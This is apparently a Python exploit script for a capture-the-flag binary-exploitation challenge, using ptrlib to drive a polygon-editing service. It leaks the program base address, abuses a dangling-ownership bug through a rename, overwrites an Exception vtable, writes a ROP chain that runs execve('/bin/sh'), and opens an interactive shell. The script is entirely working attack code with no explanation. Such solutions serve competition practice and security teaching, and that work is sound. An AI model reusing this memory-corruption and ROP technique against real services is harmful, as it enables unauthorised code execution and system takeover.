import os
from ptrlib import *

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9002")

def new(name, vertices):
    assert len(vertices) > 2
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", name)
    sock.sendlineafter(": ", str(len(vertices)))
    for v in vertices:
        sock.sendlineafter("= ", str(v))
def show(name):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", name)
def rename(old_name, new_name, overwrite=None):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", old_name)
    sock.sendlineafter(": ", new_name)
    if overwrite == True:
        sock.sendlineafter("]: ", "y")
    elif overwrite == False:
        sock.sendlineafter("]: ", "n")
def edit(name, index, vertex):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", name)
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter("= ", str(vertex))
def to_vertex(v):
    x, y = v & 0xffffffff, v >> 32
    x = u32(p32(x), signed=True)
    y = u32(p32(y), signed=True)
    return (x, y)

elf = ELF("../distfiles/chall")
sock = Socket(HOST, int(PORT))

# Leak address
show("X")
proc_base = int(sock.recvregex("_Dmain \[(0x[0-9a-f]+)\]")[0], 16) - elf.symbol('_Dmain') - 901
logger.info("proc = " + hex(proc_base))
elf.set_base(proc_base)

rop_push_rcx_or_praxM75h_cl_pop_rsp_and_al_8h_add_rsp_18h = proc_base + 0x000a459a
rop_pop_rdi = proc_base + 0x0011f893
rop_pop_rsi_r15 = proc_base + 0x0011f891
rop_xor_edx_edx = proc_base + 0x000a39d9
rop_pop_rax = proc_base + 0x000aa2cd
rop_syscall = proc_base + 0x000d1ab1

# Reset a polygon (dangling ownership)
new("evil", [(0,0), (0,0), (0,0)])
new("dummy", [(0xdead,0xcafe), (0x1234,0x2345), (0x1111,0x2222)])
rename("evil", "dummy", overwrite=False)

# Overwrite vtable
target = elf.symbol("_D9Exception6__vtblZ") + 0x40
value = rop_push_rcx_or_praxM75h_cl_pop_rsp_and_al_8h_add_rsp_18h
edit("evil", target // 8, to_vertex(value))

# Prepare ROP chain
chain = {
    0x10: u64(b'/bin/sh\0'),
    0x18: rop_pop_rdi,
    0x20: elf.symbol("_D9Exception6__vtblZ") + 0x10, # /bin/sh
    0x28: rop_xor_edx_edx,
    0x30: rop_pop_rsi_r15,
    0x38: 0,
    0x48: rop_pop_rax,
    0x50: 59,
    0x58: rop_syscall
}
for offset in chain:
    logger.info("Writing @" + hex(offset))
    target = elf.symbol("_D9Exception6__vtblZ") + offset
    edit("evil", target // 8, to_vertex(chain[offset]))

# Exception vtable hijack
show("X")

sock.interactive()
